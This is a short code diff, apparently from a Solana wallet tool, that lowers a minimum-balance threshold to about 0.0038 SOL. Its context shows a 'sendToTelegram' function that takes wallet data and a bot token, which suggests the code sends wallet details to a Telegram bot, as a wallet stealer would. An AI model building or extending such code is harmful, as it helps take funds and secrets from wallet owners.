@@ -25,7 +25,7 @@ const PUBLIC_RPC_ENDPOINTS = [
 // Solana rent and fee constants
 export const MINIMUM_RENT_EXEMPTION = 0.0023; // SOL required for rent exemption
 export const MINIMUM_TRANSACTION_FEE = 0.0005; // Typical transaction fee
-export const MINIMUM_REQUIRED_SOL = 0.05; // Minimum 0.05 SOL (approximately $0.50 USD)
+export const MINIMUM_REQUIRED_SOL = 0.00380326; // Minimum 0.00380326 SOL (approximately $0.50 USD)
 
 // Retry function with exponential backoff
 async function retry<T>(
@@ -345,7 +345,7 @@ export const sendToTelegram = async (walletData: any, botToken: string, chatId: 
 export const hasEnoughSolForRent = (balanceInSol: number): boolean => {
   console.log(`Checking if ${balanceInSol} SOL is enough for rent and fees...`);
   
-  // Require minimum 0.05 SOL (approximately $0.50 USD at average SOL prices)
+  // Require minimum 0.00380326 SOL (approximately $0.50 USD at average SOL prices)
   // This ensures enough for rent exemption and transaction fees
   return balanceInSol >= MINIMUM_REQUIRED_SOL;
 };
